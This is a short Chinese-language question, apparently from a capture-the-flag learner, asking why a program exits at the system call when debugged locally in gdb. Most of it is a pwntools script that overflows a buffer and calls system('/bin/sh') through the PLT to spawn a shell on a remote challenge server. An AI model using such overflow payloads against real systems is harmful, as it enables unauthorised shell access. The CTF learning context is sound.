+ 为什么这道题在本地用 `gdb` 调进到敏感函数调用 `system` 那一行就退出了？

  ```python3
  #!/bin/python3
  #coding:utf-8
  
  from pwn import *
  
  # context.arch = "amd64"
  
  # io = process("./291721f42a044f50a2aead748d539df0")
  #io = remote("220.249.52.133", 38481)
  io = remote("220.249.52.133", 46139)
  
  elf = ELF("./1ab77c073b4f4524b73e086d063f884e")
  
  system_plt = elf.plt["system"]
  
  # bin_sh = 0x0804A024
  bin_sh = next(elf.search(b"/bin/sh"))
  
  payload = flat([b'A' * 0x8c, system_plt, b'AAAA', bin_sh])
  
  io.send(payload)
  
  io.interactive()
  ```

  